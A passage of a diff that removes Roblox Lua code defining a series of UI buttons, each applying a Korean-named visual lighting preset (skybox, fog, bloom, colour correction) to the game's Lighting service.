-        local Lighting = game:GetService("Lighting")
 
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
 
-        Lighting.Ambient = Color3.fromRGB(20, 35, 30)
-        Lighting.Brightness = 0.7
-        Lighting.ColorShift_Bottom = Color3.fromRGB(10, 25, 20)
-        Lighting.ColorShift_Top = Color3.fromRGB(40, 90, 70)
-        Lighting.EnvironmentDiffuseScale = 0.4
-        Lighting.EnvironmentSpecularScale = 0.6
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(25, 40, 35)
-        Lighting.ShadowSoftness = 0.5
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 1.5
-        Lighting.GeographicLatitude = 80
-        Lighting.FogColor = Color3.fromRGB(10, 20, 18)
-        Lighting.FogEnd = 7000
-        Lighting.FogStart = 500
-
-        local atmosphere = Instance.new("Atmosphere", Lighting)
-        atmosphere.Density = 0.25
-        atmosphere.Offset = 0.1
-        atmosphere.Color = Color3.fromRGB(120, 230, 180)
-        atmosphere.Decay = Color3.fromRGB(15, 30, 25)
-        atmosphere.Glare = 0.5
-        atmosphere.Haze = 1.2
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.MoonAngularSize = 18
-        sky.MoonTextureId = "rbxassetid://6444320592"
-        sky.SkyboxBk = "rbxassetid://9243960010"
-        sky.SkyboxDn = "rbxassetid://9243960627"
-        sky.SkyboxFt = "rbxassetid://9243960167"
-        sky.SkyboxLf = "rbxassetid://9243960299"
-        sky.SkyboxRt = "rbxassetid://9243960475"
-        sky.SkyboxUp = "rbxassetid://9243960765"
-        sky.StarCount = 5000
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 1.8
-        bloom.Size = 40
-        bloom.Threshold = 0.7
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.01
-        cc.Contrast = 0.18
-        cc.Saturation = 0.25
-        cc.TintColor = Color3.fromRGB(240, 255, 245)
-    end
-})
-
-bdTab:CreateButton({
-    Name = "🌸 봄날의 낙원 (애니 감성)",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(140, 135, 145)
-        Lighting.Brightness = 2.8
-        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
-        Lighting.ColorShift_Top = Color3.fromRGB(255, 215, 220)
-        Lighting.EnvironmentDiffuseScale = 0.6
-        Lighting.EnvironmentSpecularScale = 0.5
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(165, 150, 160)
-        Lighting.ShadowSoftness = 0.15
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 10.5
-        Lighting.GeographicLatitude = 25
-        Lighting.FogColor = Color3.fromRGB(245, 230, 235)
-        Lighting.FogEnd = 15000
-        Lighting.FogStart = 800
-
-        local atmosphere = Instance.new("Atmosphere", Lighting)
-        atmosphere.Density = 0.32
-        atmosphere.Offset = 0.15
-        atmosphere.Color = Color3.fromRGB(255, 210, 220)
-        atmosphere.Decay = Color3.fromRGB(190, 180, 210)
-        atmosphere.Glare = 1.5
-        atmosphere.Haze = 1.0
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://2612711018"
-        sky.SkyboxDn = "rbxassetid://2612712217"
-        sky.SkyboxFt = "rbxassetid://2612711311"
-        sky.SkyboxLf = "rbxassetid://2612711585"
-        sky.SkyboxRt = "rbxassetid://2612711831"
-        sky.SkyboxUp = "rbxassetid://2612712521"
-        sky.StarCount = 0
-        sky.SunAngularSize = 14
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 1.2
-        bloom.Size = 35
-        bloom.Threshold = 1.4
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.04
-        cc.Contrast = 0.15
-        cc.Saturation = 0.35
-        cc.TintColor = Color3.fromRGB(255, 250, 255)
-
-        local sunrays = Instance.new("SunRaysEffect", Lighting)
-        sunrays.Intensity = 0.18
-        sunrays.Spread = 0.7
-    end
-})
-
-bdTab:CreateButton({
-    Name = "🏜️ 고대 사막의 황금기",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(70, 55, 40)
-        Lighting.Brightness = 3.5
-        Lighting.ColorShift_Bottom = Color3.fromRGB(100, 70, 40)
-        Lighting.ColorShift_Top = Color3.fromRGB(255, 180, 80)
-        Lighting.EnvironmentDiffuseScale = 0.5
-        Lighting.EnvironmentSpecularScale = 0.8
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(140, 115, 90)
-        Lighting.ShadowSoftness = 0.05
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 16.3
-        Lighting.GeographicLatitude = 12
-        Lighting.FogColor = Color3.fromRGB(230, 195, 160)
-        Lighting.FogEnd = 5000
-        Lighting.FogStart = 200
-
-        local atmosphere = Instance.new("Atmosphere", Lighting)
-        atmosphere.Density = 0.55
-        atmosphere.Offset = 0.3
-        atmosphere.Color = Color3.fromRGB(255, 200, 140)
-        atmosphere.Decay = Color3.fromRGB(80, 50, 30)
-        atmosphere.Glare = 3.5
-        atmosphere.Haze = 4.0
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://180537464"
-        sky.SkyboxDn = "rbxassetid://180537415"
-        sky.SkyboxFt = "rbxassetid://180537477"
-        sky.SkyboxLf = "rbxassetid://180537453"
-        sky.SkyboxRt = "rbxassetid://180537489"
-        sky.SkyboxUp = "rbxassetid://180537427"
-        sky.SunAngularSize = 30
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 1.5
-        bloom.Size = 55
-        bloom.Threshold = 1.8
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.02
-        cc.Contrast = 0.22
-        cc.Saturation = 0.2
-        cc.TintColor = Color3.fromRGB(255, 245, 230)
-
-        local sunrays = Instance.new("SunRaysEffect", Lighting)
-        sunrays.Intensity = 0.35
-        sunrays.Spread = 0.8
-    end
-})
-
-bdTab:CreateButton({
-    Name = "💧 비 개인 유리빛 세상",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(90, 110, 125)
-        Lighting.Brightness = 4.0
-        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
-        Lighting.ColorShift_Top = Color3.fromRGB(200, 230, 255)
-        Lighting.EnvironmentDiffuseScale = 0.8
-        Lighting.EnvironmentSpecularScale = 1.5
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(150, 175, 195)
-        Lighting.ShadowSoftness = 0.1
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 12
-        Lighting.GeographicLatitude = 35
-        Lighting.FogColor = Color3.fromRGB(210, 230, 245)
-        Lighting.FogEnd = 25000
-        Lighting.FogStart = 2000
-
-        local atmosphere = Instance.new("Atmosphere", Lighting)
-        atmosphere.Density = 0.15
-        atmosphere.Offset = 0
-        atmosphere.Color = Color3.fromRGB(235, 245, 255)
-        atmosphere.Decay = Color3.fromRGB(140, 165, 185)
-        atmosphere.Glare = 2.0
-        atmosphere.Haze = 0.5
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://14454790076"
-        sky.SkyboxDn = "rbxassetid://14454790575"
-        sky.SkyboxFt = "rbxassetid://14454790185"
-        sky.SkyboxLf = "rbxassetid://14454790312"
-        sky.SkyboxRt = "rbxassetid://14454790434"
-        sky.SkyboxUp = "rbxassetid://14454790691"
-        sky.SunAngularSize = 10
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 0.8
-        bloom.Size = 25
-        bloom.Threshold = 2.2
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.05
-        cc.Contrast = 0.3
-        cc.Saturation = 0.4
-        cc.TintColor = Color3.fromRGB(245, 250, 255)
-
-        local sunrays = Instance.new("SunRaysEffect", Lighting)
-        sunrays.Intensity = 0.1
-        sunrays.Spread = 0.5
-    end
-})
-bdTab:CreateButton({
-    Name = "🔮 안드로메다의 눈물 (보랏빛 성운)",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(20, 15, 35)
-        Lighting.Brightness = 1.0
-        Lighting.ColorShift_Bottom = Color3.fromRGB(40, 10, 60)
-        Lighting.ColorShift_Top = Color3.fromRGB(100, 40, 150)
-        Lighting.EnvironmentDiffuseScale = 0.5
-        Lighting.EnvironmentSpecularScale = 0.8
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(25, 15, 45)
-        Lighting.ShadowSoftness = 0.3
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 0
-        Lighting.GeographicLatitude = 45
-        Lighting.FogColor = Color3.fromRGB(15, 8, 25)
-        Lighting.FogEnd = 80000
-        Lighting.FogStart = 2000
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://152285141"
-        sky.SkyboxDn = "rbxassetid://152285108"
-        sky.SkyboxFt = "rbxassetid://152285161"
-        sky.SkyboxLf = "rbxassetid://152285191"
-        sky.SkyboxRt = "rbxassetid://152285122"
-        sky.SkyboxUp = "rbxassetid://152285175"
-        sky.StarCount = 4000
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 2.2
-        bloom.Size = 40
-        bloom.Threshold = 0.6
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.02
-        cc.Contrast = 0.25
-        cc.Saturation = 0.45
-        cc.TintColor = Color3.fromRGB(255, 240, 255)
-    end
-})
-
-bdTab:CreateButton({
-    Name = "☄️ 유성우가 쏟아지는 심야",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(10, 15, 25)
-        Lighting.Brightness = 0.5
-        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
-        Lighting.ColorShift_Top = Color3.fromRGB(20, 40, 80)
-        Lighting.EnvironmentDiffuseScale = 0.3
-        Lighting.EnvironmentSpecularScale = 0.7
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(15, 20, 35)
-        Lighting.ShadowSoftness = 0.4
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 23.8
-        Lighting.GeographicLatitude = -35
-        Lighting.FogColor = Color3.fromRGB(5, 5, 18)
-        Lighting.FogEnd = 12000
-        Lighting.FogStart = 1000
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://11652414742"
-        sky.SkyboxDn = "rbxassetid://11652415174"
-        sky.SkyboxFt = "rbxassetid://11652414841"
-        sky.SkyboxLf = "rbxassetid://11652414926"
-        sky.SkyboxRt = "rbxassetid://11652415064"
-        sky.SkyboxUp = "rbxassetid://11652415291"
-        sky.StarCount = 9000
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 1.5
-        bloom.Size = 25
-        bloom.Threshold = 0.8
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.01
-        cc.Contrast = 0.2
-        cc.Saturation = 0.3
-    end
-})
-
-bdTab:CreateButton({
-    Name = "🪐 거대 행성의 중력 (SF 우주)",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(15, 20, 30)
-        Lighting.Brightness = 1.5
-        Lighting.ColorShift_Bottom = Color3.fromRGB(30, 40, 60)
-        Lighting.ColorShift_Top = Color3.fromRGB(0, 150, 255)
-        Lighting.EnvironmentDiffuseScale = 0.5
-        Lighting.EnvironmentSpecularScale = 1.2
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(20, 25, 40)
-        Lighting.ShadowSoftness = 0.2
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 0.2
-        Lighting.GeographicLatitude = 15
-        Lighting.FogColor = Color3.fromRGB(5, 10, 20)
-        Lighting.FogEnd = 90000
-        Lighting.FogStart = 800
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://273934335"
-        sky.SkyboxDn = "rbxassetid://273934526"
-        sky.SkyboxFt = "rbxassetid://273934381"
-        sky.SkyboxLf = "rbxassetid://273934441"
-        sky.SkyboxRt = "rbxassetid://273934483"
-        sky.SkyboxUp = "rbxassetid://273934594"
-        sky.StarCount = 6000
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 2.5
-        bloom.Size = 50
-        bloom.Threshold = 0.4
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.03
-        cc.Contrast = 0.3
-        cc.Saturation = 0.4
-        cc.TintColor = Color3.fromRGB(220, 240, 255)
-    end
-})
-
-bdTab:CreateButton({
-    Name = "🩸 핏빛으로 물든 멸망의 달",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(35, 10, 10)
-        Lighting.Brightness = 0.4
-        Lighting.ColorShift_Bottom = Color3.fromRGB(20, 0, 0)
-        Lighting.ColorShift_Top = Color3.fromRGB(150, 20, 20)
-        Lighting.EnvironmentDiffuseScale = 0.1
-        Lighting.EnvironmentSpecularScale = 0.5
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(40, 12, 12)
-        Lighting.ShadowSoftness = 0.8
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 1.0
-        Lighting.GeographicLatitude = 41
-        Lighting.FogColor = Color3.fromRGB(25, 5, 5)
-        Lighting.FogEnd = 3000
-        Lighting.FogStart = 100
-
-        local atmosphere = Instance.new("Atmosphere", Lighting)
-        atmosphere.Density = 0.4
-        atmosphere.Color = Color3.fromRGB(200, 30, 30)
-        atmosphere.Decay = Color3.fromRGB(15, 0, 0)
-        atmosphere.Glare = 0
-        atmosphere.Haze = 2.0
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.MoonAngularSize = 40
-        sky.MoonTextureId = "rbxassetid://1084351190"
-        sky.SkyboxBk = "rbxassetid://11144211158"
-        sky.SkyboxDn = "rbxassetid://11144211158"
-        sky.SkyboxFt = "rbxassetid://11144211158"
-        sky.SkyboxLf = "rbxassetid://11144211158"
-        sky.SkyboxRt = "rbxassetid://11144211158"
-        sky.SkyboxUp = "rbxassetid://11144211158"
-        sky.StarCount = 500
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 1.8
-        bloom.Size = 60
-        bloom.Threshold = 0.9
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = -0.04
-        cc.Contrast = 0.35
-        cc.Saturation = 0.2
-        cc.TintColor = Color3.fromRGB(255, 200, 200)
-    end
-})
-
-bdTab:CreateButton({
-    Name = "🌅 아스달의 지평선 (붉은 성운)",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(60, 35, 30)
-        Lighting.Brightness = 2.0
-        Lighting.ColorShift_Bottom = Color3.fromRGB(100, 30, 20)
-        Lighting.ColorShift_Top = Color3.fromRGB(240, 100, 50)
-        Lighting.EnvironmentDiffuseScale = 0.5
-        Lighting.EnvironmentSpecularScale = 0.8
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(80, 45, 35)
-        Lighting.ShadowSoftness = 0.15
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 18.5
-        Lighting.GeographicLatitude = -20
-        Lighting.FogColor = Color3.fromRGB(50, 25, 20)
-        Lighting.FogEnd = 15000
-        Lighting.FogStart = 500
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://6008860031"
-        sky.SkyboxDn = "rbxassetid://6008860471"
-        sky.SkyboxFt = "rbxassetid://6008860165"
-        sky.SkyboxLf = "rbxassetid://6008860274"
-        sky.SkyboxRt = "rbxassetid://6008860381"
-        sky.SkyboxUp = "rbxassetid://6008860580"
-        sky.StarCount = 1500
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 1.6
-        bloom.Size = 45
-        bloom.Threshold = 1.0
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.02
-        cc.Contrast = 0.22
-        cc.Saturation = 0.4
-    end
-})
-
-bdTab:CreateButton({
-    Name = "🌌 황금빛 스페이스 네불라",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(30, 25, 15)
-        Lighting.Brightness = 1.6
-        Lighting.ColorShift_Bottom = Color3.fromRGB(50, 40, 20)
-        Lighting.ColorShift_Top = Color3.fromRGB(220, 160, 60)
-        Lighting.EnvironmentDiffuseScale = 0.6
-        Lighting.EnvironmentSpecularScale = 1.0
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(35, 30, 20)
-        Lighting.ShadowSoftness = 0.2
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 0
-        Lighting.GeographicLatitude = 0
-        Lighting.FogColor = Color3.fromRGB(20, 15, 10)
-        Lighting.FogEnd = 120000
-        Lighting.FogStart = 1000
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://12061405105"
-        sky.SkyboxDn = "rbxassetid://12061405785"
-        sky.SkyboxFt = "rbxassetid://12061405372"
-        sky.SkyboxLf = "rbxassetid://12061405524"
-        sky.SkyboxRt = "rbxassetid://12061405625"
-        sky.SkyboxUp = "rbxassetid://12061405903"
-        sky.StarCount = 8000
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 2.4
-        bloom.Size = 55
-        bloom.Threshold = 0.5
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.03
-        cc.Contrast = 0.28
-        cc.Saturation = 0.5
-        cc.TintColor = Color3.fromRGB(255, 245, 220)
-    end
-})
-
-bdTab:CreateButton({
-    Name = "❄️ 영원한 겨울의 혹한 오로라",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(15, 25, 35)
-        Lighting.Brightness = 0.8
-        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 30, 50)
-        Lighting.ColorShift_Top = Color3.fromRGB(100, 200, 255)
-        Lighting.EnvironmentDiffuseScale = 0.5
-        Lighting.EnvironmentSpecularScale = 0.8
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(20, 30, 45)
-        Lighting.ShadowSoftness = 0.4
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 2.0
-        Lighting.GeographicLatitude = 85
-        Lighting.FogColor = Color3.fromRGB(8, 15, 25)
-        Lighting.FogEnd = 8000
-        Lighting.FogStart = 400
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://9243960010"
-        sky.SkyboxDn = "rbxassetid://9243960627"
-        sky.SkyboxFt = "rbxassetid://9243960167"
-        sky.SkyboxLf = "rbxassetid://9243960299"
-        sky.SkyboxRt = "rbxassetid://9243960475"
-        sky.SkyboxUp = "rbxassetid://9243960765"
-        sky.StarCount = 6000
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 1.6
-        bloom.Size = 35
-        bloom.Threshold = 0.7
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.02
-        cc.Contrast = 0.2
-        cc.Saturation = 0.35
-        cc.TintColor = Color3.fromRGB(230, 250, 255)
-    end
-})
-
-bdTab:CreateButton({
-    Name = "🌆 스카이라인 애니메이션 노을",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(55, 35, 45)
-        Lighting.Brightness = 2.6
-        Lighting.ColorShift_Bottom = Color3.fromRGB(120, 40, 80)
-        Lighting.ColorShift_Top = Color3.fromRGB(255, 130, 100)
-        Lighting.EnvironmentDiffuseScale = 0.6
-        Lighting.EnvironmentSpecularScale = 0.7
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(85, 55, 65)
-        Lighting.ShadowSoftness = 0.1
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 18.0
-        Lighting.GeographicLatitude = 40
-        Lighting.FogColor = Color3.fromRGB(210, 130, 140)
-        Lighting.FogEnd = 20000
-        Lighting.FogStart = 1000
-
-        local atmosphere = Instance.new("Atmosphere", Lighting)
-        atmosphere.Density = 0.3
-        atmosphere.Color = Color3.fromRGB(255, 150, 150)
-        atmosphere.Decay = Color3.fromRGB(80, 40, 100)
-        atmosphere.Glare = 1.5
-        atmosphere.Haze = 1.5
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://2612711018"
-        sky.SkyboxDn = "rbxassetid://2612712217"
-        sky.SkyboxFt = "rbxassetid://2612711311"
-        sky.SkyboxLf = "rbxassetid://2612711585"
-        sky.SkyboxRt = "rbxassetid://2612711831"
-        sky.SkyboxUp = "rbxassetid://2612712521"
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 1.8
-        bloom.Size = 45
-        bloom.Threshold = 1.2
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.03
-        cc.Contrast = 0.18
-        cc.Saturation = 0.5
-
-        local sunrays = Instance.new("SunRaysEffect", Lighting)
-        sunrays.Intensity = 0.2
-        sunrays.Spread = 0.75
-    end
-})
-
-bdTab:CreateButton({
-    Name = "🌌 평행 우주의 신비 (사이언스 필드)",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(10, 25, 30)
-        Lighting.Brightness = 1.4
-        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 50, 80)
-        Lighting.ColorShift_Top = Color3.fromRGB(0, 200, 255)
-        Lighting.EnvironmentDiffuseScale = 0.5
-        Lighting.EnvironmentSpecularScale = 1.1
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(15, 30, 40)
-        Lighting.ShadowSoftness = 0.25
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 0
-        Lighting.GeographicLatitude = -60
-        Lighting.FogColor = Color3.fromRGB(4, 12, 20)
-        Lighting.FogEnd = 100000
-        Lighting.FogStart = 1500
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = true
-        sky.SkyboxBk = "rbxassetid://12450383177"
-        sky.SkyboxDn = "rbxassetid://12450384260"
-        sky.SkyboxFt = "rbxassetid://12450383437"
-        sky.SkyboxLf = "rbxassetid://12450383636"
-        sky.SkyboxRt = "rbxassetid://12450383921"
-        sky.SkyboxUp = "rbxassetid://12450384501"
-        sky.StarCount = 9999
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 2.0
-        bloom.Size = 40
-        bloom.Threshold = 0.5
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = 0.02
-        cc.Contrast = 0.26
-        cc.Saturation = 0.4
-        cc.TintColor = Color3.fromRGB(230, 255, 255)
-    end
-})
-
-bdTab:CreateButton({
-    Name = "🌌 딥 스페이스 나이트메어 (암흑 성운)",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-
-        for _, obj in ipairs(Lighting:GetChildren()) do
-            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
-            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
-                obj:Destroy()
-            end
-        end
-
-        Lighting.Ambient = Color3.fromRGB(5, 5, 8)
-        Lighting.Brightness = 0.6
-        Lighting.ColorShift_Bottom = Color3.fromRGB(15, 0, 15)
-        Lighting.ColorShift_Top = Color3.fromRGB(40, 10, 40)
-        Lighting.EnvironmentDiffuseScale = 0.1
-        Lighting.EnvironmentSpecularScale = 0.4
-        Lighting.GlobalShadows = true
-        Lighting.OutdoorAmbient = Color3.fromRGB(8, 5, 12)
-        Lighting.ShadowSoftness = 0.6
-        Lighting.Technology = Enum.Technology.Future
-        Lighting.ClockTime = 23.5
-        Lighting.GeographicLatitude = 45
-        Lighting.FogColor = Color3.fromRGB(2, 1, 4)
-        Lighting.FogEnd = 40000
-        Lighting.FogStart = 2000
-
-        local sky = Instance.new("Sky", Lighting)
-        sky.CelestialBodiesShown = false
-        sky.SkyboxBk = "rbxassetid://152285141"
-        sky.SkyboxDn = "rbxassetid://152285108"
-        sky.SkyboxFt = "rbxassetid://152285161"
-        sky.SkyboxLf = "rbxassetid://152285191"
-        sky.SkyboxRt = "rbxassetid://152285122"
-        sky.SkyboxUp = "rbxassetid://152285175"
-        sky.StarCount = 2000
-
-        local bloom = Instance.new("BloomEffect", Lighting)
-        bloom.Intensity = 1.2
-        bloom.Size = 30
-        bloom.Threshold = 0.9
-
-        local cc = Instance.new("ColorCorrectionEffect", Lighting)
-        cc.Brightness = -0.02
-        cc.Contrast = 0.35
-        cc.Saturation = 0.2
